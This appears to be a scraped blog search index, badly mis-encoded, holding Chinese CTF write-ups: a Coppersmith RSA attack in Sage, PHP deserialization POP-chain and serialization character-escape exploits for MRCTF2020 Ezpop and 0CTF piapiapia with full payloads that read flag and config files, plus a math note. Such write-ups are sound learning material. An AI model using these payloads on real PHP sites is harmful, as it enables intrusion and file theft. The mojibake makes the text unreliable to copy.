å› æ­¤å¯ä»¥åˆ©ç”¨åœ¨å¤šé¡¹å¼çš„æ¬§å‡ é‡Œå¾—ç®—æ³•ç®—å‡ºè¿™ä¸ªå…¬å› å¼$x - M_2$, ä¹Ÿå°±æ˜¯æˆ‘ä»¬è¦ç®—çš„M 1234567891011x = PRx.gen() g1 = x**e - C1g2 = (x + diff)**e - C2# è¾—è½¬ç›¸é™¤æ³•æ±‚å…¬å› å¼while g2: g1, g2 = g2, g1 % g2g = g1.monic()# g = xn + 92782661709340169703868140576276816382956055756557631391697803785121887338308072309948803413610339884338855507056808173780823100612346393533355160251650215111996263513671265306614427524745781162849613136748611330041590288489365015322686961617690785110909682202890569108842866175345662756188830323253136519607M = -g[0] Mç®—å‡ºæ¥äº†åˆ«å¿˜äº†é™¤ä¸€ä¸ª2^64(ä¸€å¼€å§‹ä¸ºäº†æ–¹ä¾¿è®¡ç®—æ‰€ä»¥æŠŠmæ”¾å¤§äº†, è¿˜å¥½ä¸å½±å“è§£é¢˜, ä»¥ååšçš„æ—¶å€™è¦å°å¿ƒä¸ºäº†æ–¹ä¾¿è®¡ç®—å¯¼è‡´ç®—ä¸å‡ºæ ¹æ¥, æ‰€ä»¥æœ€åçš„ä»£ç æ˜¯ 123456789101112131415161718192021222324252627282930313233343536373839404142C1 = 80653989110793139102855968265870741534421660712327094406252902072101613222389965470648960909763762225046314865847982289607336162281576790259047039000290839621007818742162307587677505606906923990312494483089046762906753345262127057162580025978324312642501118741099945205580088180943278903718853065363662232083C2 = 5400424653941721880728309040044485787870754570249463205700803061685717472238274158687499478247752712211743180931379853481727502849946080245130393042405383007613277703993980940893569303012323853427216643473698166348237252515222556282004058588218846910754415888401275689026778751805826968590155607937830708498n = 92782661709340169703868140576276816382956055756557631391697803785121887338308072309948803413610339884338861040226250478895118923994109662815448681629315227440953320952623296140315432654804940766553284237954507627610922864055435652884184926768295740697589798180602153344302964255974935777945481843144629875127C1=(C1*2**192)%ne = 3n1 = nPRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n1))PRx.&lt;xn&gt; = PolynomialRing(Zmod(n1))PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n1)) g1 = x**e - C1g2 = (x + y)**e - C2 q1 = g1.change_ring(PRZZ)q2 = g2.change_ring(PRZZ)h = q2.resultant(q1)h = h.univariate_polynomial()h = h.change_ring(PRx).subs(y=xn)h = h.monic()roots = h.small_roots(X=2**64, beta=0.4)diff = roots[0]x = PRx.gen() g1 = x**e - C1g2 = (x + diff)**e - C2 while g2: g1, g2 = g2, g1 % g2g = g1.monic()M = -g[0]h =hex(M*inverse_mod(2**64,n))[2:]s=&quot;&quot;for i in range(0,len(h),2): s+=chr(int(h[i:i+2],16))print(s)# s = HITCTF2020{dde65d8adf22b5e1a0c0c10eff23c24c} ä¸€ä¸‹å­å­¦äº†ä¸¤ä¸ªæ–¹æ³•å¥½çˆ½å•Š, åœ¨çœ‹åˆ°eå¾ˆå°çš„æ—¶å€™, ä¸€å®šè¦æƒ³èµ·coppersmithæ¥.ä¸è¿‡è¿™äº›åº”è¯¥éƒ½ç®—æ˜¯åŸºç¡€çš„, ç‰¹åˆ«æ˜¯coppersmithçš„ä½¿ç”¨æ„Ÿè§‰è¿˜æœ‰å¾ˆå¤šå¾ˆæ·±å¥¥çš„åœ°æ–¹,","link":"/2020/12/10/HITCTF2020-ezRSA-The-learing-or-Coppers/"},{"title":"cryptoå¤å¥-CryptoCTF2021","text":"","link":"/2022/02/21/CryptoCTF2021/"},{"title":"Noting of [MRCTF2020]Ezpop","text":"è¿™ä¸ªé“¾å­æœ‰å¤Ÿé•¿çš„ æ¦‚è¿°ä¸»è¦è€ƒå¯Ÿ: ååºåˆ—åŒ–é­”æœ¯æ–¹æ³• æ–‡ä»¶åŒ…å«ä¼ªåè®® è¿™ä¸¤éƒ¨åˆ†å¯ä»¥æ‰¾ååºåˆ—åŒ–ç¬”è®°å’Œæ–‡ä»¶åŒ…å«ç¬”è®° ä»£ç å®¡è®¡ä»£ç ä¸é•¿ç›´æ¥è´´å‡ºæ¥ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?php//flag is in flag.phpclass Modifier { protected $var; public function append($value){ include($value); } public function __invoke(){ $this-&gt;append($this-&gt;var); }}class Show{ public $source; public $str; public function __construct($file='index.php'){ $this-&gt;source = $file; echo 'Welcome to '.$this-&gt;source.&quot;&lt;br&gt;&quot;; } public function __toString(){ return $this-&gt;str-&gt;source; } public function __wakeup(){ if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) { echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; } }}class Test{ public $p; public function __construct(){ $this-&gt;p = array(); } public function __get($key){ $function = $this-&gt;p; return $function(); }}if(isset($_GET['pop'])){ @unserialize($_GET['pop']);}else{ $a=new Show; highlight_file(__FILE__);} å¼€å¤´æç¤ºç»™äº†flagåœ¨flag.phpä¸­, æ‰€ä»¥è¦æƒ³åŠæ³•è¯»å–ä»–.å¤§æ¦‚çœ‹äº†ä¸€é, å‘ç°ä¸ªModifier.append()é‡Œé¢æœ‰ä¸ªinclude(), è¦æƒ³åŠæ³•è°ƒç”¨å®ƒ. è€Œåœ¨åŒä¸ªç±»ä¸­å®šä¹‰äº†é­”æœ¯æ–¹æ³•__invoke()ä¼šè°ƒç”¨append(). è¦æƒ³è°ƒç”¨__invoke(), å°±è¦æŠŠå¯¹è±¡å½“æˆæ˜¯å‡½æ•°è¿›è¡Œè°ƒç”¨. åˆ†æåˆ°è¿™é‡Œå…ˆæ–­å¼€, å› ä¸ºæˆ‘ä»¬è¿˜ä¸çŸ¥é“åˆ°åº•æœ‰å•¥åŠæ³•å¼€å§‹å‡½æ•°é“¾çš„è°ƒç”¨. ä»£ç é‡Œé¢åªæœ‰ä¸€è¡Œ@unserialize($_GET['pop']);, è¦æƒ³åœ¨ååºåˆ—åŒ–åè¿›è¡Œæ›´å¤šæ“ä½œ, ä¼°è®¡æ˜¯éœ€è¦ä¸€ä¸ª__wakeup()çš„, è€Œç±»Showæ˜¯å®šä¹‰äº†__wakeup(), è€Œè¿™ä¸ª__wakeup()ä¸­åªå­˜åœ¨ä¸€ä¸ªè°ƒç”¨$this-&gt;source = &quot;index.php&quot;;, è¿™æ˜¯ä¸€ä¸ªå¯¹å­—ç¬¦ä¸²çš„æ“ä½œ, å¯ä»¥é©¬ä¸Šæƒ³åˆ°__toString() è€Œç±»Showä¸­åŒæ ·æœ‰__toString(), ç»§ç»­çœ‹ä¸‹å», __toString()é‡Œä¾ç„¶åªæœ‰ä¸€ä¸ªè°ƒç”¨return $this-&gt;str-&gt;source;è¿™é‡Œå¯ä»¥è°ƒç”¨ä¸€ä¸ªå˜é‡, è¦æƒ³åˆ°__get(), åˆšå¥½ç±»Testä¸­æœ‰__get(), è€Œè¿™ä¸ª__get()å°±æä¾›äº†ä¸€ä¸ªå‡½æ•°è°ƒç”¨çš„å…¥å£. åˆ°äº†è¿™é‡Œæˆ‘ä»¬å°±æ‰¾åˆ°äº†ä¸€ä¸ªè°ƒç”¨é“¾: @unserialize($_GET['pop']) -&gt; Show.__wakeup() -&gt; Show.__toString() -&gt; Test.__get() -&gt; Modifier.__invoke() -&gt; Modifier.appen() -&gt; include() payloadæ„é€ æˆ‘ä»¬è·Ÿç€è°ƒç”¨é“¾ä¸€æ­¥ä¸€æ­¥æ„é€ å³å¯, è¿™é‡Œè¿˜éœ€è¦æ³¨æ„ä¸€ä¸‹, å› ä¸ºæ˜¯è¦åŒ…å«ä¸€ä¸ªphpæ–‡ä»¶, ç›´æ¥åŒ…å«ä¼šç›´æ¥æ‰§è¡Œ, é‚£ä¹ˆé‡Œé¢çš„å˜é‡å°±çœ‹ä¸åˆ°äº†, è¦ç”¨php:\\\\filterè®²æ–‡ä»¶base64ç¼–ç å†åŒ…å«è¿›æ¥. 12345678910111213141516171819&lt;?phpclass Show{ public $source; public $str = 'ftp';}class Modifier{ protected $var = 'php://filter/read=convert.base64-encode/resource=./flag.php';}class Test{ public $p;}$a = new Show;$b = new Show;$c = new Test;$d = new Modifier;$c-&gt;p = $d;$b-&gt;str = $c;$a-&gt;source = $b;echo urlencode(serialize($a)); å¾—åˆ°payload: 1O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A59%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D.%2Fflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3Bs%3A3%3A%22ftp%22%3B%7D expç›´æ¥ä¼ å°±å®Œäº‹äº†. ä¼ å®Œæ‹¿åˆ°æ–‡ä»¶åbase64è§£ç ä¸€ä¸‹","link":"/2021/03/25/Noting-of-MRCTF2020-Ezpop/"},{"title":"Noting of [0CTF 2016]piapiapia","text":"è¿™é¢˜ç®—æ˜¯ç¬¬ä¸€æ¬¡åšæ¯”è¾ƒé•¿çš„webé¢˜, æ”¶è·å¾ˆå¤š, å¥½å¥½è®°å½•ä¸€ä¸‹ æ¦‚è¿°è¿™é“é¢˜ä¸»è¦çš„è€ƒå¯Ÿç‚¹æœ‰: æºç æ³„éœ² æ•°ç»„ç»•è¿‡æ­£åˆ™åŒ¹é…å’Œstrlen() ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ æºç æ³„éœ²å°±ä¸€ä¸ªç™»å½•é¡µé¢, éšä¾¿è¾“å…¥å°è¯•å¼±å¯†ç ç™»å½•æ— æœ.æµ‹è¯•æ˜¯å¦å­˜åœ¨sql, ä¹Ÿæ²¡ä»€ä¹ˆæ”¶è·éšæ‰‹ä¸€è¯•www.zip, å¯ä»¥ä¸‹è½½ å­˜åœ¨æºç æ³„éœ² æºç ä¸»è¦æœ‰è¿™å‡ ä¸ªæ–‡ä»¶: update.php register.php profile.php index.php config.php class.php ä»£ç å®¡è®¡ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸åšctfè‚¯å®šè¦æ‰¾flag, config.phpä¸­å°±æœ‰$flag, æ‰€ä»¥è¦æƒ³åŠæ³•è¯»å–config.php.å¤§æ¦‚æµè§ˆäº†ä¸€ä¸‹, åœ¨profile.phpä¸­å‘ç°äº†è¿™ä¹ˆä¸€è¡Œ $photo = base64_encode(file_get_contents($profile['photo'])); å†å¾€ä¸Šæ‰¾æ‰¾çœ‹è¿™ä¸ªå‡½æ•°ä¸­çš„å‚æ•°æ˜¯å¦å¯æ§, ä¸‹é¢æ˜¯å¾€ä¸Šæ‰¾çš„è¿‡ç¨‹: 12345678910111213141516171819202122232425262728// profile.php$profile = unserialize($profile); // å¯èƒ½å­˜åœ¨ååºåˆ—åŒ–æ¼æ´, ä¹Ÿå¯ä»¥çŸ¥é“è¿™é‡Œçš„$profileæ˜¯ä¸ªåºåˆ—åŒ–ä¸², ç»§ç»­å¾€å‰$phone = $profile['phone'];$email = $profile['email'];$nickname = $profile['nickname'];$photo = base64_encode(file_get_contents($profile['photo']));$profile=$user-&gt;show_profile($username); // $profile æ˜¯è°ƒç”¨$user-&gt;show_profile()å¾—åˆ°çš„// class.phppublic function show_profile($username) { // profileæ˜¯ä»æ•°æ®åº“è¯»å‡ºæ¥çš„, å¹¶ä¸”æ²¡æœ‰å¤„ç†, æ‰€ä»¥æ•°æ®åº“ä¸­å°±æ˜¯åºåˆ—åŒ–å­—ç¬¦ä¸² $username = parent::filter($username); $where = &quot;username = '$username'&quot;; $object = parent::select($this-&gt;table, $where); return $object-&gt;profile; }public function update_profile($username, $new_profile) { // profileä¸Šä¼ æ—¶ä¼šç»è¿‡ä¸€æ¬¡è¿‡æ»¤ $username = parent::filter($username); $new_profile = parent::filter($new_profile); // è¿™ä¸ªè¿‡æ»¤å™¨ä¼šæ›¿æ¢å­—ç¬¦, å¯ä»¥ä½¿å¾—å­—ç¬¦é•¿åº¦å˜é•¿ $where = &quot;username = '$username'&quot;; return parent::update($this-&gt;table, 'profile', $new_profile, $where); } çœ‹åˆ°è¿™é‡Œå¤§æ¦‚å°±æœ‰æ€è·¯äº†, $profileæ˜¯ä¸Šä¼ è‡³æ•°æ®åº“åé‡æ–°è¯»å–ä¸‹æ¥çš„, è€Œä¸”ä¸Šä¼ ä¹‹å‰ä¼šå¯¹åºåˆ—åŒ–ä¸²è¿›è¡Œä¸€æ¬¡æ›¿æ¢, æ›¿æ¢å­˜åœ¨å­—ç¬¦æ•°é‡å¢åŠ , ä¹Ÿå°±æ„å‘³ç€å¯ä»¥å­—ç¬¦é€ƒé€¸, å¦‚æœæœ‰å­—ç¬¦é€ƒé€¸, é‚£ä¹ˆå®Œå…¨å¯ä»¥ä¼ªé€ ä¸€ä¸ªå‡çš„$profile['photo']='config.php', ç„¶åè¯»å–flag å†ç»§ç»­å¾€å‰çœ‹ 123456789101112131415161718192021222324// register.php æä¾›äº†æ³¨å†Œçš„å…¥å£, æ³¨å†Œå®Œå°±èƒ½éšä¾¿ç™»å½•äº†, ç™»å½•åå°±èƒ½ä¸Šä¼ profile// update.php$username = $_SESSION['username'];if(!preg_match('/^\\d{11}$/', $_POST['phone'])) die('Invalid phone');if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email'])) die('Invalid email');if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10) die('Invalid nickname');$file = $_FILES['photo'];if($file['size'] &lt; 5 or $file['size'] &gt; 1000000) die('Photo size error');move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));$profile['phone'] = $_POST['phone'];$profile['email'] = $_POST['email'];$profile['nickname'] = $_POST['nickname'];$profile['photo'] = 'upload/' . md5($file['name']);$user-&gt;update_profile($username, serialize($profile)); å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„æœ‰å¾ˆå¤šå‚æ•°phone, email, nicknameéƒ½å¯ä»¥, ä½†æ˜¯å¦‚æœè¦è¿›è¡Œå­—ç¬¦é€ƒé€¸, å¿…ç„¶ä¼šè¢«å‰é¢çš„æ­£åˆ™å‘ç°å¯¼è‡´ä¸Šä¼ å¤±è´¥, æ‰€ä»¥è¦æƒ³åŠæ³•ç»•è¿‡ æ•°ç»„ç»•è¿‡phpä¸­çš„æ•°ç»„æ˜¯ä¸€ä¸ªå¾ˆç¥å¥‡çš„ä¸œè¥¿, ä»–ä¼šæœ‰ä¸‹é¢è¿™äº›ç‰¹æ€§ md5(Array()) = null sha1(Array()) = null ereg(pattern,Array()) =null preg_match(pattern,Array()) = false strcmp(Array(), â€œabcâ€) =null strpos(Array(),â€œabcâ€) = null strlen(Array()) = null 5.3ä»¥ä¸‹ç‰ˆæœ¬æ— æŠ¥é”™, 5.3åŠä»¥ä¸Šç‰ˆæœ¬ä¼šå‡ºç°E_NOTICEçº§åˆ«é”™è¯¯, ä¸‹é¢æœ‰å…³äºé”™è¯¯ç­‰çº§çš„ä¸€äº›çŸ¥è¯† æˆ‘ä»¬å¯ä»¥çœ‹åˆ°, å¦‚æœå‚æ•°æ˜¯æ•°ç»„, é‚£ä¹ˆpreg_match()å’Œstrlen()éƒ½ä¼šè¿”å›NULL,å¹¶ä¸”å‡ºç°E_NOTICEé”™è¯¯, è¿™ä¸ªé”™è¯¯æ˜¯ä¸å½±å“ç¨‹åºç»§ç»­è¿è¡Œçš„. æ‰€ä»¥, æˆ‘ä»¬åªè¦ä¼ å‚nickname[]=xxxxxx, å°±å¯ä»¥ç»•è¿‡è¿™ä¸ªæ­£åˆ™, ä»»æ„æ§åˆ¶å‚æ•°$_POST['nickname']äº† 12if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10) die('Invalid nickname'); PHP é”™è¯¯ç­‰çº§E_NOTICE è¡¨ç¤ºä¸€èˆ¬æƒ…å½¢ä¸è®°å½•ï¼Œåªæœ‰ç¨‹å¼æœ‰é”™è¯¯æƒ…å½¢æ—¶æ‰ç”¨åˆ°ï¼Œä¾‹å¦‚ä¼å›¾å­˜å–ä¸€ä¸ªä¸å­˜åœ¨çš„å˜æ•°ï¼Œæˆ–æ˜¯å‘¼å« stat() å‡½å¼æ£€è§†ä¸å­˜åœ¨çš„æ¡£æ¡ˆã€‚E_WARNING é€šå¸¸éƒ½ä¼šæ˜¾ç¤ºå‡ºæ¥ï¼Œä½†ä¸ä¼šä¸­æ–­ç¨‹å¼çš„æ‰§è¡Œã€‚è¿™å¯¹é™¤é”™å¾ˆæœ‰æ•ˆã€‚ä¾‹å¦‚ï¼šç”¨æœ‰é—®é¢˜çš„å¸¸è§„è¡¨ç¤ºæ³•å‘¼å« ereg()ã€‚E_ERROR é€šå¸¸ä¼šæ˜¾ç¤ºå‡ºæ¥ï¼Œäº¦ä¼šä¸­æ–­ç¨‹å¼æ‰§è¡Œã€‚æ„å³ç”¨è¿™ä¸ªé®ç½©æ— æ³•è¿½æŸ¥åˆ°è®°å¿†ä½“é…ç½®æˆ–å…¶å®ƒçš„é”™è¯¯ã€‚E_PARSE ä»è¯­æ³•ä¸­å‰–æé”™è¯¯ã€‚E_CORE_ERROR ç±»ä¼¼ E_ERRORï¼Œä½†ä¸åŒ…æ‹¬ PHPæ ¸å¿ƒé€ æˆçš„é”™è¯¯ã€‚E_CORE_WARNING ç±»ä¼¼ E_WARNINGï¼Œä½†ä¸åŒ…æ‹¬ PHP æ ¸å¿ƒé”™è¯¯è­¦å‘Šã€‚ æ‰€ä»¥æ•´ä¸ªæµç¨‹å°±æ˜¯ é€šè¿‡ç»•è¿‡æ­£åˆ™ä»»æ„ä¸Šä¼ nickename -&gt; æ›¿æ¢serialize_stringä¸­çš„å­—ç¬¦æ”¹å˜å­—ç¬¦é•¿åº¦é€ æˆå­—ç¬¦é€ƒé€¸ -&gt; åˆ©ç”¨file_get_contents()è¯»å–config.php payloadæ„é€ é‚£ä¹ˆè¦æ€ä¹ˆæ„é€ nickname[]æ¥è¿›è¡Œå­—ç¬¦é€ƒé€¸å‘¢, å…ˆæ¥çœ‹çœ‹è¿™ä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²å¤§æ¦‚æ˜¯æ€æ ·çš„ 1234567$profile['phone'] = '11111111111';$profile['email'] = '11111111@qq.com';$profile['nickname'] = $_GET['nickname'];$profile['photo'] = 'upload/' . md5($file['name']);echo serialize($profile);# ?nickname[]=# a:4:{s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:15:&quot;11111111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:0:&quot;&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;} å¦‚æœæˆ‘ä»¬æƒ³æœ€åååºåˆ—åŒ–å‡ºæ¥çš„photo =&gt; config.php,é‚£ä¹ˆä¼ ä¸Šå»çš„nicknameæœ€åä¸€æ®µåº”è¯¥æ˜¯è¿™ä¸ª&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}, è¿™æ®µå­—ç¬¦ä¸€å…±34ä¸ª, å†çœ‹ä¸€ä¸‹æ›¿æ¢çš„å‡½æ•° 123$safe = array('select', 'insert', 'update', 'delete', 'where');$safe = '/' . implode('|', $safe) . '/i'; # è¿‡æ»¤'select', 'insert', 'update', 'delete', 'where' æ›¿æ¢æˆhackerreturn preg_replace($safe, 'hacker', $string); å¯ä»¥çœ‹åˆ°, åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²serialize_stringä¸­å­˜åœ¨whereæ—¶ä¼šè¢«æ›¿æ¢æˆhacker, é‚£ä¹ˆå­—ç¬¦ä¸²é•¿åº¦å°±ä¼š+1æ‰€ä»¥nicknameä¸­éœ€è¦34ä¸ªwhereå°±èƒ½æŠŠåé¢çš„å­—ç¬¦æŒ¤å‡ºå»å®ç°é€ƒé€¸, å¯ä»¥çœ‹ä¸€ä¸‹å…·ä½“æ•ˆæœ 12345678910111213# ?nickname[]=#wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}$profile['phone'] = '11111111111';$profile['email'] = '11111111@qq.com';$profile['nickname'] = $_GET['nickname'];$profile['photo'] = 'upload/' . md5($file['name']);echo serialize($profile);# a:4:{s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:15:&quot;11111111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;}echo filter(serialize($profile));# a:4:{s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:15:&quot;11111111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:204:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;} ç­‰åˆ°ååºåˆ—åŒ–çš„æ—¶å€™, å°±åªä¼šååºåˆ—åŒ–å‰é¢ä¸€éƒ¨åˆ†äº† 1a:4:{s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:15:&quot;11111111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:204:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;} ç»“æœå°±ä¼šæ˜¯: 12345array(4) { [&quot;phone&quot;]=&gt; string(11) &quot;11111111111&quot; [&quot;email&quot;]=&gt; string(15) &quot;11111111@qq.com&quot; [&quot;nickname&quot;]=&gt; array(1) { [0]=&gt; string(204) &quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot; } [&quot;photo&quot;]=&gt; string(10) &quot;config.php&quot; } æˆåŠŸäº†! EXPå…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªç”¨æˆ·å¹¶ç™»å½•ï¼Œåœ¨profileä¸Šä¼ çš„æ—¶å€™å…ˆéšä¾¿å¡«å†™æ•°æ®ï¼Œå†æŠ“åŒ…ï¼Œå°†nicknameæ”¹æˆnickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;} ä¸Šä¼ å®Œåè®¿é—®profile.php, æŸ¥çœ‹å›¾ç‰‡çš„åœ°å€ï¼Œæœ€åæŠŠbase64è½¬æˆæ–‡æœ¬å°±æœ‰flagäº†","link":"/2021/03/23/Noting-of-0CTF-2016-piapiapia/"},{"title":"Finding Small Solutions to Small Degree Polynomials","text":"Finally, Coppersmith! Finding Small Solutions to Small Degree PolynomialsUnivariate Modular PolynomialThe definition of â€œsmall rootsâ€: All integers $x_0$ such that $|x_0| &lt; B$ and $p(x_0)=0\\mod N$, where B is a suitable bound of $x_0$ and $p(x)$ is a univariate polynomial of small degree, $N$ is a modulus of unknown factorization. We assume $p$ is monic and the gcd of its coefficients be relatively prime to $N$. We set:$$p(x) = x^d + p_{d-1}x^{d-1} + \\cdots + p_2x^2 + p_1x + p_0$$The first approach is essentially due to Hastad. We can take attention to one collection $C_1$ of polynomials:$$C_1 = \\{x_i,0 \\le i &lt; d\\} \\cup \\{p(x)/N\\}$$For each polynomials $q \\in C_1$ , and all small root $x_0$, $q(x_0)$ is an integer. The same will be the true of any integer linear combination of polynomials in $C_1$. And we can get a lattice$$L =\\begin{pmatrix}1&amp;0&amp;0&amp; \\cdots&amp;0&amp;0&amp;p_0 /N \\\\0&amp;B&amp;0&amp; \\cdots&amp;0&amp;0&amp;p_1 /N \\\\0&amp;0&amp;B^2&amp;\\cdots&amp;0&amp;0&amp;p_2/N \\\\&amp;&amp;&amp;\\vdots \\\\0&amp;0&amp;0&amp;\\cdots&amp;B^{d-2}&amp;0p_{d-2}B^{d-2}/N \\\\0&amp;0&amp;0&amp;\\cdots&amp;0&amp;B^{d-1}&amp;p_{d-1}B^{d-1}/N \\\\0&amp;0&amp;0&amp;\\cdots&amp;0&amp;0&amp;B^d/N\\end{pmatrix}$$Apply lattice basis reduction. Because $L_1$ has dimension $d+1$ and determinant $N^{-1}B^{d(d+1)/2}$, we will find a nonzero vector $v$ of length$$|v| &lt; c_1(d)det(L_1)^{1/(d+1)} = c_1N^{-1/(d+1)}B^{d/2},$$where $c_1(d)$ is a constant depending on the dimension. We interpret a vector $\\mathbb v = (v_0,v_1B,\\cdots,v_dB^d)$ as a polynomial $v(x) = \\sum v_ix^i$. I can not understand â€¦to be continued","link":"/2021/04/04/Finding-Small-Solutions-to-Small-Degree-Polynomials/"},{"title":"Noting of [å®‰æ´µæ¯ 2019]easy_serialize_php","text":"åˆæ˜¯ä¸€é¢˜å­—ç¬¦é€ƒé€¸, ä¸è¿‡è¿˜æœ‰å…¶ä»–è¦æ³¨æ„çš„ç‚¹ æ¦‚è¿°è¿™é¢˜è€ƒå¯Ÿçš„ç‚¹æœ‰: ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ extract()å˜é‡è¦†ç›– ä»£ç å®¡è®¡æç¤ºè¯´phpinfo()ä¸­æœ‰ä¸œè¥¿, æ‰¾äº†ä¸€ä¸‹å‘ç°æœ‰auto_append_file: d0g3_f1ag.phpauto_append_file: è®¾ç½®æ¯ä¸ªphpä¸­éƒ½è‡ªåŠ¨requireä¸€ä¸ªæ–‡ä»¶ ä¸­é—´æœ‰ä¸ªextract($_POST), å¯èƒ½å­˜åœ¨å˜é‡è¦†ç›– åœ¨ä»£ç çš„æœ€å, å­˜åœ¨file_get_contents(base64_decode($userinfo['img'])) çœ‹å‚æ•°æ˜¯å¦å¯æ§, å¯ä»¥çœ‹åˆ°æœ‰ä¸¤è¡Œ$userinfo = unserialize($serialize_info) $serialize_info = filter(serialize($_SESSION)) ç¡®è®¤æœ‰åºåˆ—åŒ–å’Œååºåˆ—åŒ–, è€Œ$serialize_infoåœ¨åºåˆ—åŒ–ä¹‹åå­˜åœ¨ä¸€ä¸ªè¿‡æ»¤ä½¿å¾—å­—ç¬¦å‡å°‘ å¯èƒ½å­˜åœ¨å­—ç¬¦é€ƒé€¸æ¥ç»†ç»†çœ‹ä¸€ä¸‹$_SESSION 12345$_SESSION = array( &quot;user&quot; =&gt; 'guest', &quot;function&quot; =&gt; @$_GET['f'], &quot;img&quot; =&gt; sha1(base64_encode($_GET['img_path'])),) å¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªå‚æ•°æ˜¯å¯ä»¥æ§åˆ¶çš„, ä½†&quot;img&quot;ä¼šè¿›è¡Œä¸€æ¬¡sha1åŠ å¯†, ååºåˆ—åŒ–åå´ä¸è¿›è¡Œsha1è§£å¯†, æ‰€ä»¥æ— è®ºè¾“å…¥ä»€ä¹ˆåŸºæœ¬éƒ½æ˜¯æ— æ•ˆçš„â€¦ è€Œ&quot;function&quot;æ˜¯å¯æ§, ä¸”å­˜åœ¨å­—ç¬¦é€ƒé€¸, ä½†å¦‚æœè¦æ‰§è¡Œfile_get_contents()â€‹, å¿…é¡»æœ‰$function='show_image', åœ¨$functionçš„å€¼èµ‹ç»™$_SESSIONä¹‹å, å­˜åœ¨ä¸€ä¸ª$extract($_POST), æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªä¿®æ”¹$function ä¸ºshow_image åˆ°è¿™é‡Œæ€è·¯å°±æ¸…æ¥šäº†: file_get_contents(base64_decode($userinfo['img']))å‚æ•°å¯æ§ -&gt; åˆ©ç”¨å­—ç¬¦é€ƒé€¸ä»&quot;funtion&quot;æ§åˆ¶&quot;img&quot; -&gt; åˆ©ç”¨ extract()å˜é‡è¦†ç›–ä¿®æ”¹$functionä¸ºshow_image ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸æ€»ç»“äº†æŒºå¤šæ¬¡äº†â€¦ è¿™æ¬¡çš„filteræ˜¯å­—ç¬¦å‡å°‘çš„æ›¿æ¢, éœ€è¦åˆ©ç”¨æ•°ç»„æ¥è¿›è¡Œé€ƒé€¸, å…·ä½“åŸç†ä¸å¤šè®²äº†, å¯ä»¥çœ‹ååºåˆ—åŒ–é‚£ç¯‡ç¬”è®° extract()å˜é‡è¦†ç›–è¿™ä¸ªè¿˜æ˜¯ç¬¬ä¸€æ¬¡é‡åˆ°,. extract() 